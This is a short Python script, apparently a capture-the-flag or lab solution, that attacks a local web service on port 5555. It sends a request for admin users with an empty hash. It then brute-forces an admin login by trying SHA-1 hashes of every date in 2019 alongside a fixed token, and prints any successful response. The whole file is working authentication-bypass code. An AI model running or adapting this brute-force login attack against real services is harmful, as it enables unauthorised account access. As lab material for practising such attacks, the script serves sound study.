import requests 
import hashlib 

payload = {
    'action': 'get-users',
    'type': 'admin',
    'hash': ''
}


res = requests.post('http://127.0.0.1:5555/', json=payload)
print(res.status_code)
print(res.text)

payload = {
    'action': 'login',
    'username': 'admin',
    'token': 'Y3liZXI=',
    'hash' : ''
}


for i in range(1, 13):
    for j in range(1, 31):
        i_format = str(i).zfill(2)
        j_format = str(j).zfill(2)
        
        hash = hashlib.sha1(f'{j}/{i}/2019'.encode()).hexdigest()
        payload['hash'] = hash
        res = requests.post('http://127.0.0.1:5555/', json=payload)
        if res.status_code == 200:
            print(res.status_code)
            print(res.text)

